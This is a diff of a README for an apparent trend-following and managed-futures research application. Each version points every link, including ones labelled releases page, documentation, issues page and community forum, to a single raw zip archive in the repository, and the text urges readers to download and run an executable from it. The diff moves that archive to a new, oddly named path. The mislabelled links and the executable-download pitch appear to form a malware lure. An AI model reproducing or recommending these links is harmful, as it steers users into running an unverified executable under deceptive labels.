@@ -1,7 +1,7 @@
 # 🛠️ systematic-trend-following-with-managed-futures - Your Path to Smarter Investing
 
 ## 📥 Download the Application
-[![Download](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip)](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip)
+[![Download](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip)](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the "systematic-trend-following-with-managed-futures" application. This tool offers a modular way to research systematic trend-following and managed futures strategies. You'll find features for validating multi-asset futures data, building contracts, running backtests, and simulating trading costs.
@@ -23,13 +23,13 @@ To run the application smoothly, ensure you meet these requirements:
 
 ## 🛠️ Installation Instructions
 ### 1. **Visit the Download Page**
-Go to the [Releases page](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip).
+Go to the [Releases page](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip).
 
 ### 2. **Choose the Latest Version**
 Look for the latest release at the top of the page. You will see options to download the executable file.
 
 ### 3. **Download the File**
-Click on the file link to download it to your computer. It will usually be named something like `https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip`.
+Click on the file link to download it to your computer. It will usually be named something like `https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip`.
 
 ### 4. **Install the Application**
 Once the file is downloaded:
@@ -60,8 +60,8 @@ This application relates to areas such as finance, fintech, hedge funds, investi
 
 ## 🔗 Additional Resources
 Check out the following links for help and more information:
-- [Official Documentation](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip)
-- [Community Forum](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/androcyte/systematic-trend-following-with-managed-futures.zip)
+- [Official Documentation](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/FelipeBatista02/systematic-trend-following-with-managed-futures/main/examples/notebooks/following-with-systematic-managed-futures-trend-3.7.zip)
 
 By following these steps, you'll be able to download, install, and run the application for managing and researching systematic trend-following strategies. Enjoy exploring smarter investment approaches!
